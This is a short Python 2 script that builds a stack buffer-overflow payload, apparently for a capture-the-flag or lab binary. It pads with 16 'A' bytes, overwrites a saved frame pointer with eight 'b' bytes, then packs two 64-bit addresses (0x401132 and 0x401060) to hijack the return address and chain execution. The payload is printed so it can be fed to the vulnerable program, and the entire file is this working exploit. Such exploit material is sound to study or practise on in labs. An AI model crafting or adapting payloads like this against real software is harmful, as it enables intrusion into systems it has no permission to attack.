import struct

out = 'A'*0x10
out += 'bbbbbbbb'

out += struct.pack('Q', 0x401132)
# out += 'bbbbbbbb'
out += struct.pack('Q', 0x401060)

print(out)
